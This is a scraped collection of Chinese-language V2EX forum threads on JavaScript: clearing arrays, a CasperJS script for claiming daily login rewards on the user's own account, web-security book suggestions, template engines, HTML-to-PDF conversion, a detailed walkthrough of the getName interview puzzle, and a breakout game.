{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如 var arrayList = ['a','b','c','d','e','f'];</p>\n<p>怎么清空 arrayList</p>\n<p>另外怎么判断一个 object 是否是数组(array)？</p>\n</div></div>"], "reply": "44", "tittle": "JavaScript 怎么清空数组？", "comment": ["arrayList.length = 0\r", "Obj instanceOf Array", "Array.isArray(obj)", "arrayList=[]", " 大兄弟 好厉害", " 哈哈 这是我看过的最友好的答案", "var isArray =  Array.isArray || function(obj) {\r", "    return toString.call(obj) === '[object Array]';\r", "};", "谢谢~", "var isArray = Array.isArray || function(obj) { \r", "return Object.prototype.toString.call(obj) === '[object Array]'; \r", "};", "楼主下次应该问\"如何优雅的清空一个数组\"", "1L 给出的答案是比较好的方法", " 其实#11 楼更友好", " 11 楼这个太卡了，打不开→_→", " 11 楼是 google 版本", " 厉害了", " 也都是之前从 V 站看到的", "哈哈哈，学到了个好玩的东西～\r", "[lmbtfy]( ", " 文王清空数组)", " 你说你学到了，然而你没学到 = =。你自己点开看看", " 手机版回复不支持 md+打错字😓", " 跟手机不手机没关系的，你的网址有空格", " 需要一个 “我帮你 FanQiang 和 Google ” 的网站", " \r", "\r", "只是 google 的话，一般改下 hosts ，然后用 ", " 访问就行，不用翻。\r", "也就是 ", " 空格是 V2EX 自动加的，盘古之白，他的网址应该转码再发", " 我知道\r", "\r", "“我帮你 FanQiang 和 Google ”\r", "就是 镜像站 + lmgtfy", " 原来是这样", "arrayList.splice(0, arrayList.length);", " 这个真好玩", "arrayList = [];", " 全场最佳", "xxx = [...[]]", "4 楼厉害了 ", " 清空数组", " 66666", " 看到你这个我也想写个", " 服你", " 啊！支持 4 楼……我的亲哥！\r", "这种问题不是百度第一条就是嘛…… LZ 什么都不搜就直接来问吗？", "arrayList.length = 0", " 666", " 棒棒的", "arrayList.length = 0", " 可以搞个 google 的呀！！", " 11 楼的就是啊", "歪一下楼\r", "arrayList = [] 是创建了一个新数组，原先那个数组**可能**还在内存里，取决于有没有其他地方还在引用它。\r", "arrayList.length = 0 是清空了原先的数组。", " 简直不能再 6   哈哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在 <a href=\"http://a.com/a.php\" rel=\"nofollow\">a.com/a.php</a> 页面标签&lt;script src=\"&amp;lt;a href=\" http:=\"\" b.com=\"\" abc.js\"=\"\" rel=\"nofollow\"&gt;b.com/abc.js\"&gt;&lt;/script&gt; abc.js 内容和直接打开 <a href=\"http://b.com/abc.js\" rel=\"nofollow\">b.com/abc.js</a> 是不一样的，这样是 JS 模板输出还是？抓包看到有 json 数据返回。这种是怎样做到的？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "JS 模板输出问题", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>##我看这有用 python 实现的自动登陆然后领取，我就想用 casperjs 实现下，但是卡住了。卡在登陆成功后，点击一个链接到一个新页面。下面是代码，有木有高手，给指导下啊。</p>\n<pre><code>var casper = require('casper').create({\n    verbose: true,\n    logLevel: 'debug'\n});\ncasper.options.waitTimeout = 1000;\nphantom.outputEncoding=\"UTF-8\";\nvar system = require('system');\n//casper.echo(system.args[4]);\n//phantom.exit();\nvar  passwd = system.args[4];\n//var fs = require(\"fs\");\nvar  passwd = 'xxxx';//v2ex passwd\nvar  name = \"xxxx\";//v2ex email\n//casper.exit();\n\n \ncasper.start('https://www.v2ex.com/signin');\n\n// ok code wcd\ncasper.then(function(){\n\tthis.fillXPath('form[action=\"/signin\"]',{\n\t\t'//input[@type=\"text\"]': name,\n\t\t'//input[@type=\"password\"]': passwd\n\t\t},false);\n});\ncasper.thenClick('input[type=\"submit\"]');\n\t\t/*\t\n\t\tcasper.thenEvaluate(\n\t\t\t\t\tfunction getgift(){\n\t\t\t\t\t\tdocument.querySelector('a[href=\"/mission/daily\"]').click();\n\t\t\t\t\t}\n\n\t\t\t\t);\n\t\t\tcasper.captureSelector('v2exok.png','a[href=\"/mission/daily\"]');\n\t\t\tcasper.echo(\"ok\");\n\t\t\t*/\ncasper.then(function() {\n    this.echo(this.getTitle());\n});\t\t\ncasper.run(\nfunction(){\n\tif(casper.exists(\".box .inner\")){\n\t\t\tcasper.echo(\"login ok\");\n\t\t\t/*\n\t\t\tcasper.thenOpen('https://www.v2ex.com/mission/daily', function() {\n\t\t\t\t//casper.captureSelector('v2exok2222.png','.box');\n\t\t\t\t//casper.click('input[value=\"领取 X 铜币\"]');\n\t\t\t\tcasper.echo(\"end\");\n\t\t\t});\n\t\t\tcasper.run();\n\t\t\t*/\n\t\t\tcasper.thenEvaluate(\n\t\t\tfunction (){\n\t\t\t\tdocument.querySelector('a[href=\"/mission/daily\"]').click();\n\t\t\t\t}\n\t\t\t);\n\t\t\t//casper.clickLabel('领取今日的登录奖励','a');\n\t\t\tcasper.capture('1.png');\n\t\t\tcasper.then(function() {\n\t\t\t    this.wait(5000,function() {\n\t\t\t        this.capture(\"2.png\");\n\t\t\t    });\n\t\t\t});\n\t\t\tcasper.waitForSelector('input[value=\"领取 X 铜币\"]', function() {\n\t\t\t\tcasper.echo(\"here\");\n    \t\t\tcasper.capture('3.png');\n\t\t\t}, function() {\n\t\t        this.die('no re ').exit();\n\t\t    }, 2000);\n\t\t\t\n\t\t\tcasper.exit();\n\t}else{\n\t\tcasper.echo(\"login error\");\n\t\tcasper.exit();\n\t}\n}\n);\n\n\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "v2ex 自动领取积分（ casperjs）", "comment": ["马上加工能，以后领取都要验证码。", "同楼主也是看了之前的 Python 写了一个 ", " 登陆字段是有时效的 每次都不一样"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>亚马逊搞活动，再买一两本书正好凑够 200 元，想买本 web 安全方面的书入入门。求推荐一本像 JS 高程 3 那样的好书。</p>\n</div></div>"], "reply": "6", "tittle": "求推荐书籍， web 安全方面的", "comment": ["白帽子讲 web 安全\r", "然后\r", "web 之困", "web 安全中文的就那么几本书。挑评分高的就好了，没什么太多选择的余地", "黑客攻防技术宝典 web 实战和浏览器实战  比较不错", "web 前端黑客技术解密", "推荐学安全的初学者，最好先夯实基础，掌握编程功底，然后再学习安全知识，不然很容易徘徊在脚本小子和从业者之间", " \r", " \r", " \r", " \r", " 感谢！"]},
{"content": "", "reply": "10", "tittle": "轻量级模板引擎有什么推荐，要求不高能达到 underscore template 这样就行了，项目依赖 jquery 不依赖 undersco 所以我就不想引入 underscore 了", "comment": ["art template?", "\r", "\r", "完美", "不知道又没有类似于 thymeleaf 语法的前端渲染引擎", "\r", "开发中，自带数据绑定+增量更新的静态模板引擎", "\r", "\r", "这个？", "推荐 doT.js", " 从 underscore 里扒出来丢到$里了", "underscore 里的模版函数就那么几十行，直接复制就行了。", "我记得 jquery 好像也有模板渲染啊\r", "其实最好就直接用 ES6 的模板字符串语法，加个 babel 就好了", " 完美。我要的就是这种。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用了 jsPDF 的 addHTML\n页面表格短的时候可以使用\n页面长的时候就卡死了</p>\n</div></div>"], "reply": "26", "tittle": "js 如何实现 html 转换成 pdf 呢", "comment": ["phantomjs 试试", " 头像已盗", "``` js\r", "window.print();\r", "```", " 但是页面里的数据是 ajax 生成的，还有 echart 生成的图表", " \r", "这种情况我做过，需要专门做个页面匹配 A4 纸，比如说做好的这个页面叫 B ，打印的时候生成 B ，调出 window.print ，\r", "jsPDF ？你是在开玩笑么，", " 正解.", "wkhtmltopdf 需要后端配合", "canvas 截图然后转", "不会 js 的前来捣乱", " 这个怎么批量做？", " \r", "目前为止，最简单的解决办法就是用 wkhtmltopdf ，然而这货线程安全性存在问题，并且对网站也会有安全隐患。\r", "\r", " \r", "老老实实做 A4 纸打印适配的页面即可，然后调用 window.print ，没有捷径，这个方法能够尽量保证在 IE, Edge ， Chrome ， Firefox 打印效果的一致性。", "nightmare 大法好", "  您好请问做 a4 纸适配页面有什么思路吗", " 请问能否详细谈谈 wkhtmltopdf 的安全问题？", " \r", "简单点的 A4 ，比如 A 页面，各种渲染，你试试 做个页面 B ，内容和 A 页面一致，但保持固定 800px 宽度的 div ，页面生成后执行 window.print 即可。\r", "这只是个参考，你可以自己试试生成效果，如果你是前后端分离，前端代码基本上代码可以重用 A 的，后端依然是原始接口，还是满方便的。\r", "\r", "注意，各个浏览器可能存在打印的颜色差距大的问题，这个要慢慢调了。", "  多谢 我在 a 页面点击弹出 800px 的 b 页面 然后调用 window.print 就可以了吧", " 我之前也有批量 html 转 pdf 需求，用 wkhtmltopdf 做的，我不太明白 window.print 怎么实现？用了以后，会弹出来 chrome 打印预览的页面，不会直接生成 PDF 啊，还需要自己再手动保存成 pdf", " 后台干吧，不能啥事都指望前端 js 来做", " wkhtmltopdf 的安全问题能否详细谈谈", "  您好，我想请教下 我 width 设置成了 210mm\r", "宽度能够整体打印了\r", "但是长度上 最后一部分会打印不上怎么办", " \r", "调用的是自带的 window.print 么？我记得自带的会自动换页的吧，", "  是自动换页。。。但是比如页面是 4 页零 2 行的内容 打印出来就少了那 2 行。。", "  确切的说是少最后一页，不够一页内容的最后一页", "  换了个浏览器用 edge 没有问题 \r", "看来是 chrome 的问题", " \r", "表格布局么？可能是表格高度没设置吧？你尝试打印静态的页面，设置好表格每行高度试试，", "  chrome 不够一页的时候会被吞掉 我加了一页空白的 div 在最下边解决了这个问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>题目</h1>\n<pre><code>function Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nFoo.getName = function () { alert (2);};\nFoo.prototype.getName = function () { alert (3);};\nvar getName = function () { alert (4);};\nfunction getName() { alert (5);}\n \n//请写出以下输出结果：\nFoo.getName();\ngetName();\nFoo().getName();\ngetName();\nnew Foo.getName();\nnew Foo().getName();\nnew new Foo().getName();\n</code></pre>\n<p>这几天面试上几次碰上这道经典的题目，特地从头到尾来分析一次答案，这道题的经典之处在于它综合考察了面试者的 JavaScript 的综合能力，包含了变量定义提升、 this 指针指向、运算符优先级、原型、继承、全局变量污染、对象属性及原型属性优先级等知识，此题在网上也有部分相关的解释，当然我觉得有部分解释还欠妥，不够清晰，特地重头到尾来分析一次，当然我们会把最终答案放在后面，并把此题再改高一点点难度，改进版也放在最后，方便面试官在出题的时候有个参考 <a href=\"https://github.com/Wscats/Good-text-Share/issues/85\" rel=\"nofollow\">顺便附上原文链接</a>\n<img alt=\"image\" src=\"https://cloud.githubusercontent.com/assets/17243165/24434776/377f6f14-1464-11e7-9dcc-75c1000040d7.png\"></p>\n<h1>第一问</h1>\n<p>先看此题的上半部分做了什么，首先定义了一个叫 Foo 的函数，之后为 Foo 创建了一个叫 getName 的静态属性存储了一个匿名函数，之后为 Foo 的原型对象新创建了一个叫 getName 的匿名函数。之后又通过函数变量表达式创建了一个 getName 的函数，最后再声明一个叫 getName 函数。</p>\n<p>第一问的<strong>Foo.getName</strong>自然是访问 Foo 函数上存储的静态属性，答案自然是 2 ，这里就不需要解释太多的，一般来说第一问对于稍微懂 JS 基础的同学来说应该是没问题的,当然我们可以用下面的代码来回顾一下基础，先加深一下了解</p>\n<pre><code>\t\tfunction User(name) {\n\t\t\tvar name = name; //私有属性\n\t\t\tthis.name = name; //公有属性\n\t\t\tfunction getName() { //私有方法\n\t\t\t\treturn name;\n\t\t\t}\n\t\t}\n\t\tUser.prototype.getName = function() { //公有方法\n\t\t\treturn this.name;\n\t\t}\n\t\tUser.name = 'Wscats'; //静态属性\n\t\tUser.getName = function() { //静态方法\n\t\t\treturn this.name;\n\t\t}\n\t\tvar Wscat = new User('Wscats'); //实例化\n</code></pre>\n<p>注意下面这几点：</p>\n<ul>\n<li>调用公有方法，公有属性，我们必需先实例化对象，也就是用 new 操作符实化对象，就可构造函数实例化对象的方法和属性，并且公有方法是不能调用私有方法和静态方法的</li>\n<li>静态方法和静态属性就是我们无需实例化就可以调用</li>\n<li>而对象的私有方法和属性,外部是不可以访问的</li>\n</ul>\n<h1>第二问</h1>\n<p>第二问，直接调用 getName 函数。既然是直接调用那么就是访问当前上文作用域内的叫 getName 的函数，所以这里应该直接把关注点放在 4 和 5 上，跟 1 2 3 都没什么关系。当然后来我问了我的几个同事他们大多数回答了 5 。此处其实有两个坑，一是变量声明提升，二是函数表达式和函数声明的区别。\n我们来看看为什么，可参考<a href=\"https://github.com/Wscats/Good-text-Share/issues/73\" rel=\"nofollow\">(1)关于 Javascript 的函数声明和函数表达式</a> <a href=\"https://github.com/Wscats/Good-text-Share/issues/86\" rel=\"nofollow\">(2)关于 JavaScript 的变量提升</a>\n在 Javascript 中，定义函数有两种类型</p>\n<h3>函数声明</h3>\n<pre><code>    // 函数声明\n    function wscat(type){\n        return type===\"wscat\";\n    }\n</code></pre>\n<h3>函数表达式</h3>\n<pre><code>    // 函数表达式\n    var oaoafly = function(type){\n        return type===\"oaoafly\";\n    }\n</code></pre>\n<p>先看下面这个经典问题，在一个程序里面同时用函数声明和函数表达式定义一个名为 getName 的函数</p>\n<pre><code>\t\tgetName()//oaoafly\n\t\tvar getName = function() {\n\t\t\tconsole.log('wscat')\n\t\t}\n\t\tgetName()//wscat\n\t\tfunction getName() {\n\t\t\tconsole.log('oaoafly')\n\t\t}\n\t\tgetName()//wscat\n</code></pre>\n<p>上面的代码看起来很类似，感觉也没什么太大差别。但实际上， Javascript 函数上的一个“陷阱”就体现在 Javascript 两种类型的函数定义上。</p>\n<ul>\n<li><strong>JavaScript 解释器中存在一种变量声明被提升的机制，也就是说函数声明会被提升到作用域的最前面，即使写代码的时候是写在最后面，也还是会被提升至最前面。</strong></li>\n<li><strong>而用函数表达式创建的函数是在运行时进行赋值，且要等到表达式赋值完成后才能调用</strong></li>\n</ul>\n<pre><code>                var getName//变量被提升，此时为 undefined\n                \n                getName()//oaoafly 函数被提升 这里受函数声明的影响，虽然函数声明在最后可以被提升到最前面了\n\t\tvar getName = function() {\n\t\t\tconsole.log('wscat')\n\t\t}//函数表达式此时才开始覆盖函数声明的定义\n\t\tgetName()//wscat\n\t\tfunction getName() {\n\t\t\tconsole.log('oaoafly')\n\t\t}\n\t\tgetName()//wscat 这里就执行了函数表达式的值\n</code></pre>\n<p>所以可以分解为这两个简单的问题来看清楚区别的本质</p>\n<pre><code>                var getName;\n\t\tconsole.log(getName)//undefined\n\t\tgetName()//Uncaught TypeError: getName is not a function\n\t\tvar getName = function() {\n\t\t\tconsole.log('wscat')\n\t\t}\n</code></pre>\n<pre><code>                var getName;\n\t\tconsole.log(getName)//function getName() {console.log('oaoafly')}\n\t\tgetName()//oaoafly\n\t\tfunction getName() {\n\t\t\tconsole.log('oaoafly')\n\t\t}\n</code></pre>\n<p>这个区别看似微不足道，但在某些情况下确实是一个难以察觉并且“致命“的陷阱。出现这个陷阱的本质原因体现在这两种类型在函数提升和运行时机（解析时 /运行时）上的差异。\n当然我们给一个总结： Javascript 中<strong>函数声明</strong>和<strong>函数表达式</strong>是存在区别的，<strong>函数声明</strong>在 JS<strong>解析时</strong>进行函数提升，因此在同一个作用域内，不管函数声明在哪里定义，该函数都可以进行调用。而<strong>函数表达式</strong>的值是在 JS<strong>运行时</strong>确定，并且在表达式赋值完成后，该函数才能调用。\n所以第二问的答案就是 4 ， 5 的函数声明被 4 的函数表达式覆盖了</p>\n<h1>第三问</h1>\n<p><code>Foo().getName();</code>先执行了 Foo 函数，然后调用 Foo 函数的返回值对象的 getName 属性函数。\nFoo 函数的第一句<code>getName = function () { alert (1); };</code>是一句函数赋值语句，注意它没有 var 声明，所以先向当前 Foo 函数作用域内寻找 getName 变量，没有。再向当前函数作用域上层，即外层作用域内寻找是否含有 getName 变量，找到了，也就是第二问中的 alert(4)函数，将此变量的值赋值为<code>function(){alert(1)}</code>。\n此处实际上是将外层作用域内的 getName 函数修改了。</p>\n<blockquote>\n<p>注意：此处若依然没有找到会一直向上查找到 window 对象，若 window 对象中也没有 getName 属性，就在 window 对象中创建一个 getName 变量。</p>\n</blockquote>\n<p>之后 Foo 函数的返回值是 this ，而 JS 的 this 问题已经有非常多的文章介绍，这里不再多说。\n简单的讲， this 的指向是由所在函数的调用方式决定的。而此处的直接调用方式， this 指向 window 对象。\n遂 Foo 函数返回的是 window 对象，相当于执行<code>window.getName()</code>，而 window 中的 getName 已经被修改为 alert(1)，所以最终会输出 1\n此处考察了两个知识点，一个是变量作用域问题，一个是 this 指向问题\n我们可以利用下面代码来回顾下这两个知识点</p>\n<pre><code>               var name = \"Wscats\";//全局变量\n\t\twindow.name = \"Wscats\";//全局变量\n\t\tfunction getName(name) {\n\t\t\tconsole.log(name); //Hello\n\t\t\tname = \"Oaoafly\"; //去掉 var 变成了全局变量\n\t\t\tvar privateName = \"Stacsw\";\n\t\t\treturn function() {\n\t\t\t\tconsole.log(this);//window\n\t\t\t\treturn privateName\n\t\t\t}\n\t\t}\n\t\tvar getPrivate = getName(\"Hello\"); //传参是局部变量\n\t\tconsole.log(name) //Oaoafly\n\t\tconsole.log(getPrivate()) //Stacsw\n</code></pre>\n<p>因为 JS 没有块级作用域，但是函数是能产生一个作用域的，函数内部不同定义值的方法会直接或者间接影响到全局或者局部变量，函数内部的私有变量可以用闭包获取，函数还真的是第一公民呀~\n而关于 this ， this 的指向在函数定义的时候是确定不了的，只有函数执行的时候才能确定 this 到底指向谁，实际上 this 的最终指向的是那个调用它的对象\n所以第三问中实际上就是 window 在调用**Foo()**函数，所以 this 的指向是 window</p>\n<pre><code>window.Foo().getName();\n//-&gt;window.getName();\n</code></pre>\n<h1>第四问</h1>\n<p>直接调用 getName 函数，相当于<code>window.getName()</code>，因为这个变量已经被 Foo 函数执行时修改了，遂结果与第三问相同，为 1 ，也就是说 Foo 执行后把全局的 getName 函数给重写了一次，所以结果就是 Foo()执行重写的那个 getName 函数</p>\n<h1>第五问</h1>\n<p>第五问<code>new Foo.getName();</code>此处考察的是 JS 的运算符优先级问题，我觉得这是这题灵魂的所在，也是难度比较大的一题\n下面是 JS 运算符的优先级表格，从高到低排列。可参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence\" rel=\"nofollow\">MDN 运算符优先级</a></p>\n<p>这题首先看优先级的第 18 和第 17 都出现关于 new 的优先级， new (带参数列表)比 new (无参数列表)高比函数调用高，跟成员访问同级</p>\n<p><code>new Foo.getName();</code>的优先级是这样的</p>\n<p>相当于是:</p>\n<pre><code>new (Foo.getName)();\n</code></pre>\n<ul>\n<li>点的优先级(18)比 new 无参数列表(17)优先级高</li>\n<li>当点运算完后又因为有个括号<code>()</code>，此时就是变成 new 有参数列表(18)，所以直接执行 new ，当然也可能有朋友会有疑问为什么遇到()不函数调用再 new 呢，那是因为函数调用(17)比 new 有参数列表(18)优先级低</li>\n</ul>\n<blockquote>\n<p>.成员访问(18)-&gt;new 有参数列表(18)</p>\n</blockquote>\n<p>所以这里实际上将 getName 函数作为了构造函数来执行，遂弹出 2 。</p>\n<h1>第六问</h1>\n<p>这一题比上一题的唯一区别就是在 Foo 那里多出了一个括号，这个有括号跟没括号我们在第五问的时候也看出来优先级是有区别的</p>\n<pre><code>(new Foo()).getName()\n</code></pre>\n<p>那这里又是怎么判断的呢？首先 new 有参数列表(18)跟点的优先级(18)是同级，同级的话按照从左向右的执行顺序，所以先执行 new 有参数列表(18)再执行点的优先级(18)，最后再函数调用(17)</p>\n<blockquote>\n<p>new 有参数列表(18)-&gt;.成员访问(18)-&gt;()函数调用(17)</p>\n</blockquote>\n<p>这里还有一个小知识点， Foo 作为构造函数有返回值，所以这里需要说明下 JS 中的构造函数返回值问题。</p>\n<h3>构造函数的返回值</h3>\n<p>在传统语言中，构造函数不应该有返回值，实际执行的返回值就是此构造函数的实例化对象。\n而在 JS 中构造函数可以有返回值也可以没有。</p>\n<ol>\n<li>没有返回值则按照其他语言一样返回实例化对象。</li>\n</ol>\n<pre><code>                function Foo(name){\n\t\t\tthis.name = name\n\t\t}\n\t\tconsole.log(new Foo('wscats'))\n</code></pre>\n<p><img alt=\"image\" src=\"https://cloud.githubusercontent.com/assets/17243165/24442903/cf6d6bf4-1492-11e7-822e-85ca44b01364.png\"></p>\n<ol>\n<li>若有返回值则检查其返回值是否为引用类型。如果是非引用类型，如基本类型（ String,Number,Boolean,Null,Undefined ）则与无返回值相同，实际返回其实例化对象。</li>\n</ol>\n<pre><code>                function Foo(name){\n\t\t\tthis.name = name\n\t\t\treturn 520\n\t\t}\n\t\tconsole.log(new Foo('wscats'))\n</code></pre>\n<p><img alt=\"image\" src=\"https://cloud.githubusercontent.com/assets/17243165/24442973/38c304c4-1493-11e7-935f-b6c60e1bcb8d.png\"></p>\n<ol>\n<li>若返回值是引用类型，则实际返回值为这个引用类型。</li>\n</ol>\n<pre><code>                function Foo(name){\n\t\t\tthis.name = name\n\t\t\treturn {\n\t\t\t\tage:16\n\t\t\t}\n\t\t}\n\t\tconsole.log(new Foo('wscats'))\n</code></pre>\n<p><img alt=\"image\" src=\"https://cloud.githubusercontent.com/assets/17243165/24443023/843a4cc8-1493-11e7-9a57-c91835622d7b.png\">\n原题中，由于返回的是 this ，而 this 在构造函数中本来就代表当前实例化对象，最终 Foo 函数返回实例化对象。\n之后调用实例化对象的 getName 函数，因为在 Foo 构造函数中没有为实例化对象添加任何属性，当前对象的原型对象(prototype)中寻找 getName 函数。\n当然这里再拓展个题外话，如果构造函数和原型链都有相同的方法，如下面的代码，那么默认会拿构造函数的公有方法而不是原型链，这个知识点在原题中没有表现出来，后面改进版我已经加上。</p>\n<pre><code>               function Foo(name) {\n\t\t\tthis.name = name\n\t\t\tthis.getName = function() {\n\t\t\t\treturn this.name\n\t\t\t}\n\t\t}\n\t\tFoo.prototype.name = 'Oaoafly';\n\t\tFoo.prototype.getName = function() {\n\t\t\treturn 'Oaoafly'\n\t\t}\n\t\tconsole.log((new Foo('Wscats')).name)//Wscats\n\t\tconsole.log((new Foo('Wscats')).getName())//Wscats\n</code></pre>\n<h1>第七问</h1>\n<p><code>new new Foo().getName();</code>同样是运算符优先级问题。\n最终实际执行为:</p>\n<pre><code>new ((new Foo()).getName)();\n</code></pre>\n<blockquote>\n<p>new 有参数列表(18)-&gt;new 有参数列表(18)</p>\n</blockquote>\n<p>先初始化 Foo 的实例化对象，然后将其原型上的 getName 函数作为构造函数再次 new ，所以最终结果为 3</p>\n<h1>答案</h1>\n<pre><code>function Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nFoo.getName = function () { alert (2);};\nFoo.prototype.getName = function () { alert (3);};\nvar getName = function () { alert (4);};\nfunction getName() { alert (5);}\n\n//答案：\nFoo.getName();//2\ngetName();//4\nFoo().getName();//1\ngetName();//1\nnew Foo.getName();//2\nnew Foo().getName();//3\nnew new Foo().getName();//3\n</code></pre>\n<h1>后续</h1>\n<p>后续我把这题的难度再稍微加大一点点(附上答案)，在 Foo 函数里面加多一个公有方法 getName ，对于下面这题如果用在面试题上那通过率可能就更低了，因为难度又大了一点，又多了两个坑，但是明白了这题的原理就等同于明白了上面所有的知识点了</p>\n<pre><code>                function Foo() {\n\t\t\tthis.getName = function() {\n\t\t\t\tconsole.log(3);\n\t\t\t\treturn {\n\t\t\t\t\tgetName: getName//这个就是第六问中涉及的构造函数的返回值问题\n\t\t\t\t}\n\t\t\t};//这个就是第六问中涉及到的， JS 构造函数公有方法和原型链方法的优先级\n\t\t\tgetName = function() {\n\t\t\t\tconsole.log(1);\n\t\t\t};\n\t\t\treturn this\n\t\t}\n\t\tFoo.getName = function() {\n\t\t\tconsole.log(2);\n\t\t};\n\t\tFoo.prototype.getName = function() {\n\t\t\tconsole.log(6);\n\t\t};\n\t\tvar getName = function() {\n\t\t\tconsole.log(4);\n\t\t};\n\n\t\tfunction getName() {\n\t\t\tconsole.log(5);\n\t\t} //答案：\n\t\tFoo.getName(); //2\n\t\tgetName(); //4\n\t\tconsole.log(Foo())\n\t\tFoo().getName(); //1\n\t\tgetName(); //1\n\t\tnew Foo.getName(); //2\n\t\tnew Foo().getName(); //3\n                //多了一问\n\t\tnew Foo().getName().getName(); //3 1\n\t\tnew new Foo().getName(); //3\n</code></pre>\n<p>@Wscats 原题最初版来源：\n<a href=\"http://www.codeceo.com/article/one-javascript-interview.html\" rel=\"nofollow\">码农网</a>\n<a href=\"http://www.cnblogs.com/xxcanghai/p/5189353.html\" rel=\"nofollow\">cnblogs</a>\n<a href=\"https://github.com/Wscats/Good-text-Share/issues/85\" rel=\"nofollow\">Github</a></p>\n</div></div>", "<div class=\"topic_content\">其实我是不建议把这些题作为考察面试者的唯一评判，但是作为一名合格的前端工程师我们不应该因为浮躁忽略了我们的一些最基本的基础知识，当然我也祝愿所有面试者找到一份理想的工作，祝愿所有面试官找到心中那匹千里马～</div>"], "reply": "34", "tittle": "前端程序员经常忽视的一个 JavaScript 面试题", "comment": ["赞。", "以前好像见过这题", "建议谨慎考虑问这类问题的公司。类似的还有问 i++ + ++i 的。我觉得就算我因为某种原因面试用了这样的题目，也是期待面试者吐槽“不要 var x; function x()，好好取名字“，而不是告诉我到底谁覆盖了谁", "哦，能顺便从基础的 iife 开始到前端模块化聊聊前端命名空间管理的更赞", "这些我都了解，能拿 6K 吗。", "答对了能有 3.8k 吗？\r", "\r", "要是我的同事写这个代码， review 不通过重写。", "这 sb 题目……", "喜欢出这个题的公司 编码风格是啥样啊", "反问出这个题的人\r", "\r", "上面的题目能答满分么？", "招聘者应该知道出笔试题的目的是什么吧，这种题不具备任何现实意义。", "挺好的，学到了新东西", "直接拉到最后，发现居然不是培训班的广告\r", "不科学", "还好全对路过。✌️", "还不如问 一个项目 npm install 报错 给出不同错误 问你咋办", "题是好题，用来招人不太合适。", "第三问的举例代码好像有处错误?我运行了下， console.log(name)打印出的是 Wscats ，而不是 Oaoafly", "虽然楼主很厉害，但是， ES6 完美解决", "拿糟粕当特性的典型", "万恶的反人类原型继承", "2017 年了还在搞 prototype 么，业务代码哪里会接触到这么多 prototype", "好多 js 里的糟粕，新的 es6 都在尽力规避，不知道问这题的人什么心态。", "渣语言 + 渣题目 + 八股", "就我想吐槽 [经常忽视的面试题] 吗？", "看到楼上的这些回复我就放心了！", "这代码通不过类型检查、 lint 检查的，也通不过 code review 的。", "我真的很讨厌这种题啊", "第二问 node 环境下值为啥不是不一样\r", "```js\r", "function Foo() {\r", "   getName = function () { console.log(1); };\r", "   return this;\r", "}\r", "\r", "Foo.getName = function () { console.log(2);};\r", "\r", "Foo.prototype.getName = function () { console.log(3);};\r", "\r", "var getName = function () { console.log(4);};\r", "\r", " \r", "function getName() { console.log(5);}\r", "```\r", "\r", "```node\r", "> getName();\r", "5\r", "```\r", "\r", "node --version v7.7.3", "老生常谈", "别程序员经常忽视了。自己把代码复制到 chrome console ，或者把 alert 改成 console.log 放到 node 底下试试吧。\r", "我觉得我还是告诉楼主吧，“茴”字一共有四种写法。", "学习了", "第五、第七说没啥意义还可以接受，其它为毛没有意义？变量提升、作用域、原型 这些东西不是很基础的？", "战略性 mark ，这道题可以加入我写的 js 教程中。但不会用来做面试题，实际开发中程序员会自行测试出哪种写法符合预期。同时团队项目也会直接通过 eslint 直接干掉类似这种调用构造函数不加 new ，混合函数表达式和函数声明，随意修改全局变量，各种重名变量等陋习。", "我个人非常喜欢楼主的这个帖子，尤其是第 5 问到第 7 问的对 new 和属性访问的解析。最近看一本 JS 设计模式的教材，里面有\r", "VehicleFactory.prototype.createVehicle = function ( options ) {\r", "\r", "  if( options.vehicleType === \"car\" ){\r", "    this.vehicleClass = Car;\r", "  }else{\r", "    this.vehicleClass = Truck;\r", "  }\r", "\r", "  return new this.vehicleClass( options );\r", "\r", "};\r", "看了楼主的分析，才对这段代码最后的 return 有了正确理解。\r", "支持楼主", "厉害了，晚点在看 mark"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>哈哈，这个其实在我写 <a href=\"https://www.v2ex.com/t/350707\" rel=\"nofollow\">贪吃蛇</a> 之前就已经完成了。这个项目之前之所以没发出来，是因为对代码不是太满意……像之前的 <a href=\"https://www.v2ex.com/t/350707\" rel=\"nofollow\">贪吃蛇</a>，我改造了好多次，当时正值学习 <a href=\"http://www.oschina.net/translate/learning-javascript-design-patterns\" rel=\"nofollow\">JavaScript 设计模式</a>，就对照着把丑陋的代码给重构了，所以后来看上去好了不少，就把它先发表了出来。这个呢，其实后来也没有变动，我想，既然写出来了，索性发布出来，请大家批评指正。</p>\n</div></div>"], "reply": "13", "tittle": "用 JavaScript 写了个经典的打砖块游戏", "comment": ["我去竟然忘加项目链接了…… ", "一直在加载，不知道为什么，搞个进度条吧", " 请问你用的是什么浏览器呢？可能是因为，我这里面有用了一些 ES6 语法，你的浏览器不支持吧~", "有 bug ，小球碰到底部游戏不会结束。", " 哈哈，是的，我偷懒了，没处理这个……我抽空来改下", "用 ES6 的话至少 babel 一下吧。。。不愿意用 babel 的话 buble 也行", "战略 mark", "点进来之前以为是 canvas..   因为我之前用 canvas 做过一个......", "战略 follow", " 可以分享一下哈", " 多谢捧场嘿", " 多谢支持哈", " 当时感觉代码也不多，本完全可以用 ES5 的语法的，用 ES6 算是为了好玩尝试下，也就没加转换。见笑啦~~"]},
